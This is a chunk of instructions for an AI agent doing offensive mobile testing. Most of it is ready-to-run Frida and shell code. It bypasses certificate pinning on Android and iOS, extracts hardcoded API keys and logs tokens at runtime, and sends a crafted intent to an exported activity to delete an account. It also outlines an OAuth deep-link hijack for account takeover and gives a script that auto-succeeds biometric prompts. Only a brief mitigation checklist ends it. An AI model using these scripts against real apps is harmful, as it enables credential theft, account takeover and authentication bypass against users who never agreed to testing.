# Mobile API Pinning Bypass & Key Extraction — Agent Chunk 82a
> Source: Mobile security research (2024-2025), Frida/objection documentation, OWASP Mobile Testing Guide, deep link exploitation case studies
> Purpose: Teaches the agent to bypass certificate pinning, extract API keys from mobile apps, exploit deep links for account takeover, and bypass biometric authentication
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing mobile API backends or when mobile apps are in scope. Certificate pinning bypass enables traffic interception; API key extraction reveals hardcoded secrets; deep link exploitation targets authentication flows. Start with static analysis (fast, no device needed) then move to dynamic analysis with Frida.

---

## 1. Certificate Pinning Bypass

### Success Rate
Research across mobile banking, fintech, and healthcare apps (2024): **19 out of 28 apps (68%)** had pinning bypassed using automated Frida scripts. The remaining 9 used custom pinning implementations requiring manual reverse engineering.

### Android — Frida/objection Bypass (Step-by-Step)

**Step 1: Set up environment**
```bash
# Install Frida on host
pip install frida-tools

# Push frida-server to rooted Android device
adb push frida-server-16.1.4-android-arm64 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server-16.1.4-android-arm64
adb shell /data/local/tmp/frida-server-16.1.4-android-arm64 &
```

**Step 2: Bypass with objection**
```bash
# Patch the APK to include Frida gadget (no root required)
objection patchapk --source target.apk

# Install patched APK
adb install target.objection.apk

# Launch and bypass pinning
objection -g com.target.app explore
# Inside objection console:
android sslpinning disable
```

**Step 3: Custom Frida script for stubborn implementations**
```javascript
// universal-ssl-bypass.js
Java.perform(function() {
    // Bypass OkHttp3 CertificatePinner
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log('[+] Bypassed OkHttp3 pinning for: ' + hostname);
        return;
    };

    // Bypass TrustManagerImpl
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
        console.log('[+] Bypassed TrustManagerImpl for: ' + host);
        return untrustedChain;
    };

    // Bypass custom X509TrustManager
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
});
```

```bash
# Run custom script
frida -U -f com.target.app -l universal-ssl-bypass.js --no-pause
```

### iOS — Frida Pinning Bypass

```javascript
// ios-ssl-bypass.js
if (ObjC.available) {
    // Bypass NSURLSession pinning
    var NSURLSessionConfiguration = ObjC.classes.NSURLSessionConfiguration;
    Interceptor.attach(
        NSURLSessionConfiguration['- setTLSMinimumSupportedProtocol:'].implementation, {
        onEnter: function(args) {
            console.log('[+] Bypassing TLS config');
        }
    });

    // Bypass ATS (App Transport Security)
    var SSLSetSessionOption = Module.findExportByName(null, 'SSLSetSessionOption');
    if (SSLSetSessionOption) {
        Interceptor.attach(SSLSetSessionOption, {
            onEnter: function(args) {
                if (args[1] == 0) args[1] = ptr(1);  // kSSLSessionOptionBreakOnServerAuth
            }
        });
    }

    // Bypass SSLKillSwitch-style protections
    var SSLHandshake = Module.findExportByName(null, 'SSLHandshake');
    Interceptor.attach(SSLHandshake, {
        onLeave: function(retval) {
            if (retval != 0) retval.replace(0);
        }
    });
}
```

---

## 2. API Key Extraction

### Static Analysis Workflow

**Android — JADX decompilation:**
```bash
# Decompile APK to Java source
jadx target.apk -d jadx_output/

# Search for API keys and secrets
grep -rPn '(api[_-]?key|api[_-]?secret|auth[_-]?token|bearer|password|client[_-]?secret)' \
  jadx_output/ --include="*.java" -i

# Search for hardcoded URLs with keys
grep -rPn 'https?://.*[?&](key|token|api_key|apikey)=' jadx_output/

# Search for Base64-encoded secrets
grep -rPn '[A-Za-z0-9+/]{40,}={0,2}' jadx_output/ --include="*.java"
```

**Android — APKTool resource extraction:**
```bash
# Decode resources (strings.xml, build configs)
apktool d target.apk -o apktool_output/

# Check string resources
grep -rPn '(api|key|secret|token|password)' apktool_output/res/values/strings.xml

# Check BuildConfig
cat apktool_output/smali/com/target/app/BuildConfig.smali
# Look for: const-string fields with API keys
```

### Dynamic Analysis — Frida Hooking

```javascript
// hook-api-keys.js - Intercept API key usage at runtime
Java.perform(function() {
    // Hook SharedPreferences reads (keys often stored here)
    var SharedPreferences = Java.use('android.content.SharedPreferences');
    var getString = SharedPreferences.getString;
    getString.implementation = function(key, defaultValue) {
        var value = getString.call(this, key, defaultValue);
        if (key.toLowerCase().includes('key') ||
            key.toLowerCase().includes('token') ||
            key.toLowerCase().includes('secret')) {
            console.log('[SharedPrefs] ' + key + ' = ' + value);
        }
        return value;
    };

    // Hook HTTP header setting (catch Authorization headers)
    var Builder = Java.use('okhttp3.Request$Builder');
    Builder.addHeader.implementation = function(name, value) {
        if (name.toLowerCase().includes('auth') ||
            name.toLowerCase().includes('key') ||
            name.toLowerCase().includes('token')) {
            console.log('[Header] ' + name + ': ' + value);
        }
        return this.addHeader(name, value);
    };
});
```

---

## 3. Deep Link Exploitation for Account Takeover

### February 2025 Case Study — OAuth Deep Link Hijack
```
Attack Flow:
1. Target app registers deep link: myapp://oauth/callback
2. Malicious app on same device registers: myapp://oauth/callback (Android allows duplicate)
3. User initiates OAuth login in target app
4. OAuth provider redirects to: myapp://oauth/callback?code=AUTH_CODE
5. Android shows disambiguation dialog, or malicious app intercepts silently
6. Attacker captures authorization code, exchanges for access token
7. Full account takeover
```

**Testing deep link registration:**
```bash
# List all registered deep links on device
adb shell dumpsys package domain-preferred-apps

# Test deep link invocation
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://oauth/callback?code=test_code"

# Check for intent filters in AndroidManifest.xml
grep -A5 'android.intent.action.VIEW' apktool_output/AndroidManifest.xml
```

### Intent Hijacking
```bash
# Look for exported activities/services with no permission requirement
grep -B2 -A10 'android:exported="true"' apktool_output/AndroidManifest.xml | \
  grep -v 'android:permission'

# Send crafted intent to exported component
adb shell am start -n com.target.app/.InternalActivity \
  --es "user_id" "admin" --es "action" "delete_account"
```

### WebView Bridge Exposure
```javascript
// Frida script to find exposed JavaScript bridges
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log('[WebView] JS Bridge exposed: ' + name);
        console.log('[WebView] Object class: ' + obj.getClass().getName());
        // List all methods on the bridge object
        var methods = obj.getClass().getMethods();
        for (var i = 0; i < methods.length; i++) {
            console.log('  Method: ' + methods[i].getName());
        }
        return this.addJavascriptInterface(obj, name);
    };
});
```

---

## 4. Biometric Authentication Bypass

```javascript
// bypass-biometric.js - Frida script
Java.perform(function() {
    // Bypass BiometricPrompt
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
    var CryptoObject = Java.use('androidx.biometric.BiometricPrompt$CryptoObject');

    BiometricPrompt.authenticate.overload(
        'androidx.biometric.BiometricPrompt$PromptInfo'
    ).implementation = function(promptInfo) {
        console.log('[+] Biometric prompt intercepted, auto-succeeding');
        // Call the success callback directly
        var callback = this._authenticationCallback.value;
        var result = AuthResult.$new(null);  // null crypto = no crypto binding
        callback.onAuthenticationSucceeded(result);
    };

    // Bypass FingerprintManager (legacy)
    var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
    FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {
        console.log('[+] FingerprintManager bypassed');
        var AuthResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
        callback.onAuthenticationSucceeded(AuthResult.$new(null, null));
    };
});
```

---

## 5. Tool Reference Table

| Tool | Platform | Purpose | Open Source |
|------|----------|---------|-------------|
| Frida | Android/iOS | Dynamic instrumentation, hooking | Yes |
| objection | Android/iOS | Runtime mobile exploration (built on Frida) | Yes |
| JADX | Android | APK to Java decompilation | Yes |
| APKTool | Android | APK decoding/rebuilding | Yes |
| MobSF | Android/iOS | Automated static + dynamic analysis | Yes |
| Burp Suite | Both | HTTP/S traffic interception | Freemium |
| mitmproxy | Both | HTTP/S proxy for traffic analysis | Yes |
| Ghidra | Both | Native code reverse engineering | Yes |
| Hopper | iOS/macOS | Disassembler/decompiler | Commercial |
| class-dump | iOS | Objective-C header extraction | Yes |
| r2frida | Both | radare2 + Frida integration | Yes |
| dex2jar | Android | DEX to JAR conversion | Yes |

---

## 6. Mitigation Checklist
- Implement certificate pinning with backup pins for rotation
- Store API keys in platform keystore (Android Keystore / iOS Keychain), not in SharedPreferences or NSUserDefaults
- Use app attestation (Android SafetyNet/Play Integrity, iOS DeviceCheck/App Attest)
- Validate deep link schemes with HTTPS App Links (Android) / Universal Links (iOS)
- Bind biometric auth to cryptographic operations (not just a boolean check)
- Use code obfuscation (ProGuard/R8 for Android, bitcode for iOS)
- Implement root/jailbreak detection with multiple layered checks
